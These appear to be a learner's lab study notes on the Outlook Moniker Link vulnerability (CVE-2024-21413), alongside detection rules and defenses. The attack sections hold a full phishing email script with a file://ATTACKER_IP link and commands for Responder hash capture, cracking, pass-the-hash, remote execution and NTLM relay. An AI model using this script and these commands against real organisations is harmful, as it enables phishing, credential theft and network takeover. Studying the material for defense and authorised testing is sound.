# Moniker Link Attack (CVE-2024-21413)

## Date Completed: March 5, 2026

## Module Overview
Studied advanced phishing technique exploiting Microsoft Outlook vulnerability CVE-2024-21413 through moniker link manipulation for NTLM credential theft, email-based social engineering, hash capture and exploitation, and Windows authentication abuse for network compromise.

---

## What is a Moniker Link?

### Definition
**Moniker** = Windows object that represents a reference to another object or resource (shortcuts, embedded documents, linked files)

**Moniker Link Attack** = Exploiting how Windows resolves these references to execute malicious code or steal credentials

### The Vulnerability (CVE-2024-21413)
- **Discovered:** January 2024
- **Affected:** Microsoft Outlook
- **Type:** Security Feature Bypass
- **Severity:** High (CVSS 9.8)
- **Impact:** Remote Code Execution, Credential Theft

---

## How the Attack Works

### Normal File Protocol Behavior
```
User clicks: file://server/share/document.txt
Windows: Opens file from network share
Security: Protected View for external files
```

### Malicious Moniker Link Exploitation
```
User clicks: file://attacker.com/malicious!exploit
Windows: Attempts to authenticate to attacker.com
Result: Sends NTLM credentials automatically
Attacker: Captures credentials (hash)
Victim: Sees "file not found" error (doesn't suspect attack)
```

### Why It Bypasses Security
- No macro warning (doesn't use VBA macros)
- No "Enable Content" prompt
- Looks like legitimate file link
- Automatic NTLM authentication (Windows feature, not bug)
- Bypasses Protected View in some cases

---

## Attack Workflow

### Phase 1: Reconnaissance

**Identify Target:**
- Company domain (e.g., company.com)
- Employee email addresses (LinkedIn, company website)
- Mail server infrastructure

**Find Mail Server:**
```bash
# MX Record lookup
dig MX company.com

# Output:
company.com.  IN  MX  10 mail.company.com.

# Get IP
dig mail.company.com
# Output: 203.0.113.50
```

**Alternative:**
```bash
nslookup -type=MX company.com
host -t MX company.com
```

---

### Phase 2: Infrastructure Setup

**Attacker Infrastructure:**

**1. SMTP Server (for sending emails)**
```bash
# Option A: Rent VPS
# Configure Postfix or similar

# Option B: Compromised email account
# Use existing SMTP credentials
```

**2. SMB Server (for capturing credentials)**
```bash
# Setup Responder to capture NTLM
sudo responder -I eth0

# Or configure legitimate SMB share
# to log authentication attempts
```

**3. Domain/Hosting**
```
# Register look-alike domain
# company-portal.com (looks like company.com)
# Or use compromised legitimate domain
```

---

### Phase 3: Craft Malicious Email

**Python Script (Educational - Lab Use Only):**

```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

# Email configuration
sender_email = 'attacker@malicious.com'
receiver_email = 'victim@company.com'
password = 'smtp_password'

# Malicious HTML content
# ATTACKER_IP = Your controlled server IP
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <body>
        <p>Dear Employee,</p>
        <p>Please review the attached invoice for Q4 processing.</p>
        <p><a href="file://ATTACKER_IP/invoices/Q4_Invoice.xlsx">View Invoice</a></p>
        <p>Best regards,<br>Finance Department</p>
    </body>
</html>"""

# Construct email
message = MIMEMultipart()
message['Subject'] = "Urgent: Q4 Invoice Review Required"
message["From"] = formataddr(('Finance Team', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

# Send via SMTP
server = smtplib.SMTP('mail.malicious.com', 25)
server.ehlo()

try:
    server.login(sender_email, password)
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("Email delivered")
except Exception as error:
    print(f"Error: {error}")
finally:
    server.quit()
```

---

### Phase 4: Victim Interaction

**Victim Receives Email:**
```
From: Finance Team <finance@company.com> (spoofed)
Subject: Urgent: Q4 Invoice Review Required

Dear Employee,

Please review the attached invoice for Q4 processing.

[View Invoice] ← Malicious link: file://ATTACKER_IP/invoices/Q4_Invoice.xlsx

Best regards,
Finance Department
```

**Victim Clicks Link:**
1. Windows attempts to access `file://ATTACKER_IP/invoices/Q4_Invoice.xlsx`
2. SMB protocol used to connect
3. Windows automatically sends NTLM authentication
4. Attacker's Responder captures credentials

---

### Phase 5: Credential Capture

**Attacker's Terminal (Running Responder):**

```bash
# Start Responder
sudo responder -I eth0 -w

# Output when victim clicks:
[SMB] NTLMv2-SSP Client   : 192.168.1.100
[SMB] NTLMv2-SSP Username : COMPANY\victim
[SMB] NTLMv2-SSP Hash     : victim::COMPANY:1122334455667788:ABCD1234567890...
```

**Captured Hash Format:**
```
victim::COMPANY:1122334455667788:ABCD1234567890ABCD1234:010100000000000...
```

**What was captured:**
- Username: `victim`
- Domain: `COMPANY`
- NTLM Hash: Can be cracked or used directly

---

## Hash Exploitation

### Method 1: Crack the Hash (Get Password)

**Using Hashcat:**
```bash
# Save hash to file
echo 'victim::COMPANY:1122...' > ntlm_hash.txt

# Crack with Hashcat (mode 5600 = NetNTLMv2)
hashcat -m 5600 ntlm_hash.txt /usr/share/wordlists/rockyou.txt

# Result:
victim::COMPANY:...:Password123!
```

**Using John the Ripper:**
```bash
# Crack with John
john --format=netntlmv2 ntlm_hash.txt --wordlist=rockyou.txt

# Show cracked password
john --show ntlm_hash.txt
# Output: victim:Password123!
```

**Now attacker has plaintext password:** `Password123!`

---

### Method 2: Pass-the-Hash (Use Hash Directly)

**No need to crack! Use hash to authenticate:**

**Access SMB Shares:**
```bash
# Using Impacket
impacket-smbclient -hashes :NTLM_HASH //192.168.1.50/C$

# Browse victim's files without password
```

**Remote Command Execution:**
```bash
# Execute commands on victim's machine
impacket-psexec -hashes :NTLM_HASH victim@192.168.1.100

# Or WMI execution
impacket-wmiexec -hashes :NTLM_HASH victim@192.168.1.100
```

**Access Remote Desktop:**
```bash
# RDP with hash (requires xfreerdp)
xfreerdp /u:victim /pth:NTLM_HASH /v:192.168.1.100
```

---

### Method 3: NTLM Relay Attack

**Instead of capturing, RELAY the hash to another system:**

```bash
# Terminal 1: Setup relay to target server
impacket-ntlmrelayx -t smb://192.168.1.200 -smb2support

# Terminal 2: Responder (without SMB/HTTP servers)
sudo responder -I eth0 -r -d

# When victim clicks link:
# 1. Authentication captured
# 2. Automatically relayed to 192.168.1.200
# 3. Attacker gains access to THAT server
```

**Result:** Compromise different system than the phished victim

---

## Real-World Attack Chain

### Complete Compromise Scenario

**Step 1: Initial Access**
```
Send phishing email → Employee clicks → Capture NTLM hash
```

**Step 2: Credential Exploitation**
```
Crack hash → Get password: Summer2024!
```

**Step 3: Lateral Movement**
```bash
# Use credentials to access file server
impacket-smbclient victim:Summer2024!@fileserver

# Download sensitive files
# Find more credentials
# Enumerate network
```

**Step 4: Privilege Escalation**
```bash
# Find domain admin
# Exploit vulnerability
# Capture domain admin hash
```

**Step 5: Domain Compromise**
```bash
# Use domain admin hash
# Access all systems
# Deploy ransomware
# OR exfiltrate data
```

**Timeline:** Email → Full domain control in hours/days

---

## Detection & Defense

### For SOC Analysts

#### **1. Email Gateway Detection**

**Indicators to block:**
- Emails with `file://` protocol in HTML
- External links using file protocol
- Suspicious protocol handlers: `ms-msdt:`, `mhtml:`

**Email filtering rules:**
```
Block: <a href="file://
Block: <a href="ms-msdt:
Alert: External file:// links
```

---

#### **2. Network Monitoring**

**Detect SMB to external IPs:**
```
Alert: Workstation → Port 445 → External IP
Alert: Office process (OUTLOOK.EXE) → SMB connection → Internet
```

**Wireshark filter:**
```
tcp.port == 445 && ip.dst != 192.168.0.0/16
```

**SIEM rule (Splunk):**
```
index=firewall dest_port=445 dest_ip!=10.0.0.0/8
| where NOT cidrmatch("10.0.0.0/8", dest_ip)
| stats count by src_ip, dest_ip
```

---

#### **3. Windows Event Log Monitoring**

**Key Event IDs:**
```
Event ID 4625: Failed authentication (may indicate hash capture attempt)
Event ID 4624: Successful logon (unusual source = pass-the-hash)
Event ID 4776: NTLM authentication (monitor for external attempts)
```

**PowerShell detection:**
```powershell
# Find unusual NTLM authentications
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4776} |
Where-Object {$_.Properties[2].Value -notmatch "^(192\.168|10\.)"} |
Select-Object TimeCreated, Message
```

---

#### **4. Endpoint Detection (EDR)**

**Behavioral indicators:**
```
Alert: OUTLOOK.EXE spawning network connections
Alert: Explorer.exe → SMB connection to external IP
Alert: Unusual file:// protocol access
```

**Process monitoring:**
```
Monitor:
- OUTLOOK.EXE → Network activity → External IP
- Explorer.exe → Child process creation
- Unusual protocol handler invocation
```

---

### Defensive Measures

#### **Technical Controls:**

**1. Email Security:**
```
- Deploy ATP (Advanced Threat Protection)
- Block file:// links in emails
- Implement DMARC/SPF/DKIM
- Sandbox suspicious attachments
```

**2. Network Segmentation:**
```
- Block outbound SMB (port 445) to internet
- Restrict internal SMB to necessary systems
- Monitor/log all SMB traffic
```

**3. Registry Hardening:**
```
# Disable MSDT URL protocol (Follina mitigation)
reg delete HKEY_CLASSES_ROOT\ms-msdt /f

# Disable automatic authentication to internet sites
# Computer Configuration → Administrative Templates → Network → Lanman Workstation
```

**4. Disable NTLM (If Possible):**
```
# Prefer Kerberos authentication
# Group Policy: Network Security: LAN Manager authentication level
# Set to: Send NTLMv2 response only. Refuse LM & NTLM
```

---

#### **User Education:**

**Security awareness training:**
- Recognize phishing emails
- Verify sender before clicking links
- Hover over links to check destination
- Report suspicious emails to IT

**Red flags to teach:**
- Urgent/threatening language
- Unexpected file share links
- Requests for immediate action
- Sender email doesn't match display name

---

## Real-World Incidents

### CVE-2024-21413 Exploitation (2024)

**Timeline:** January-February 2024

**Victims:**
- Government agencies (multiple countries)
- Defense contractors
- Financial institutions
- Technology companies

**Attack Flow:**
1. Targeted phishing emails
2. Moniker link to attacker infrastructure
3. NTLM hash capture
4. Lateral movement
5. Data exfiltration

**Impact:**
- Stolen credentials
- Compromised networks
- Data breaches
- Estimated millions in damages

**Response:**
- Microsoft released emergency patch (February 2024)
- CISA issued alert
- Organizations worldwide deployed mitigations

---

### DarkGate Malware Campaign (2023-2024)

**Technique:** Moniker links in phishing emails

**Targets:** Global (finance, healthcare, manufacturing)

**Outcome:**
- Banking trojan deployment
- Ransomware infections
- Credential theft at scale

---

## Lab Setup for Practice

### Safe Testing Environment

**Requirements:**
```
3 Virtual Machines (VirtualBox/VMware):
1. Kali Linux (Attacker)
2. Windows 10 (Victim)
3. Ubuntu Server (Mail Server)

Network: Internal only (isolated from internet)
```

**VM Configuration:**

**VM 1: Kali Linux**
```bash
IP: 192.168.56.10
Role: Attacker machine
Tools: Responder, Python, Impacket
```

**VM 2: Windows 10**
```bash
IP: 192.168.56.20
Role: Victim machine
Software: Outlook or webmail client
```

**VM 3: Ubuntu (Mail Server)**
```bash
IP: 192.168.56.30
Role: SMTP server
Software: Postfix
```

---

### Setup Instructions

**1. Configure Mail Server (Ubuntu VM):**

```bash
# Install Postfix
sudo apt update
sudo apt install postfix

# Configure for local delivery
sudo dpkg-reconfigure postfix
# Select: Internet Site
# System mail name: testlab.local

# Create test user
sudo adduser victim
# Password: testpass

# Test SMTP
telnet localhost 25
```

**2. Setup Responder (Kali VM):**

```bash
# Install Responder
sudo apt install responder

# Configure
sudo nano /etc/responder/Responder.conf
# Set: SMB = On, HTTP = On

# Run
sudo responder -I eth0 -w
```

**3. Configure Windows VM:**

```
- Set IP: 192.168.56.20
- Install email client
- Create user account
- Join workgroup: TESTLAB
```

---

### Execute Test Attack

**On Kali (Terminal 1):**
```bash
# Start Responder
sudo responder -I eth0
```

**On Kali (Terminal 2):**
```python
# Run phishing script
python3 moniker_phishing.py

# Script sends email to victim@testlab.local
# With link: file://192.168.56.10/test!exploit
```

**On Windows VM:**
```
1. Check email (victim@testlab.local)
2. Click malicious link
3. Windows attempts connection to 192.168.56.10
```

**Back on Kali (Terminal 1):**
```
[SMB] NTLMv2-SSP Hash captured!
victim::TESTLAB:112233...:ABCD...
```

**Success!** Credential captured in safe lab environment.

---

## Tools & Commands Reference

### Reconnaissance

```bash
# Find mail server
dig MX target.com
nslookup -type=MX target.com
host -t MX target.com

# Get mail server IP
dig mail.target.com

# Port scan
nmap -p 25,587,465 target.com
```

---

### Hash Cracking

```bash
# Hashcat (NetNTLMv2)
hashcat -m 5600 hash.txt rockyou.txt

# John the Ripper
john --format=netntlmv2 hash.txt --wordlist=rockyou.txt

# Show cracked
john --show hash.txt
```

---

### Pass-the-Hash

```bash
# SMB access
impacket-smbclient -hashes :NTLM_HASH //target/share

# Remote execution
impacket-psexec -hashes :NTLM_HASH user@target
impacket-wmiexec -hashes :NTLM_HASH user@target

# Enumerate domain
impacket-GetADUsers -hashes :NTLM_HASH -dc-ip DC_IP DOMAIN/
```

---

### NTLM Relay

```bash
# Setup relay
impacket-ntlmrelayx -t smb://target_server -smb2support

# With Responder (no SMB server)
sudo responder -I eth0 -r -d
```

---

## Security Applications

### For SOC Analysts (Defensive)

**Detection:**
- Monitor email gateway for file:// links
- Alert on SMB to external IPs
- Analyze Windows auth logs for anomalies
- Investigate phishing reports

**Investigation:**
- Extract email headers
- Analyze network traffic (PCAP)
- Check Windows Event Logs
- Identify compromised accounts

**Response:**
- Isolate affected systems
- Force password resets
- Block attacker infrastructure
- Deploy mitigations

---

### For Red Team / Penetration Testers (Offensive)

**Authorized Testing:**
- Phishing simulation campaigns
- Assess email security controls
- Test credential theft defenses
- Demonstrate real-world risk

**Social Engineering:**
- Craft convincing pretext emails
- Target high-value employees
- Test user security awareness
- Measure click rates and credential capture

**Reporting:**
- Document attack success rate
- Show credential exposure
- Recommend mitigations
- Demonstrate business impact

---

## Key Takeaways

### Technical Concepts

✅ **Moniker links** exploit Windows file protocol handling  
✅ **NTLM authentication** is automatic and can be captured  
✅ **Pass-the-hash** allows authentication without password  
✅ **Email phishing** remains highly effective attack vector  
✅ **Credential theft** is first step in network compromise  

### Security Principles

✅ **Defense in depth** - Multiple controls needed  
✅ **User awareness** - Critical security layer  
✅ **Monitor outbound** - Not just inbound traffic  
✅ **Authentication security** - NTLM is vulnerable  
✅ **Patch promptly** - CVEs actively exploited  

### Real-World Application

✅ **Active threat** - Used in real attacks now  
✅ **High success rate** - Users click, don't suspect  
✅ **Rapid escalation** - Click to compromise in hours  
✅ **Hard to detect** - Bypasses many controls  
✅ **Serious impact** - Can lead to full domain compromise  

---

## Resources

### Official Documentation

- **Microsoft Security Response Center**: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413
- **CISA Alert**: https://www.cisa.gov/news-events/alerts
- **MITRE ATT&CK**: T1187 (Forced Authentication), T1566 (Phishing)

### Tools

- **Responder**: https://github.com/lgandx/Responder
- **Impacket**: https://github.com/SecureAuthCorp/impacket
- **Hashcat**: https://hashcat.net/hashcat/
- **John the Ripper**: https://www.openwall.com/john/

### Learning Resources

- TryHackMe - Moniker Link Room
- HackTheBox - Windows Challenges
- SANS - SEC504 (Hacking Tools)
- PortSwigger - Email Security

---

**Remember:** This technique should only be used in authorized testing environments, personal labs, or with explicit written permission. Unauthorized use is illegal and unethical.
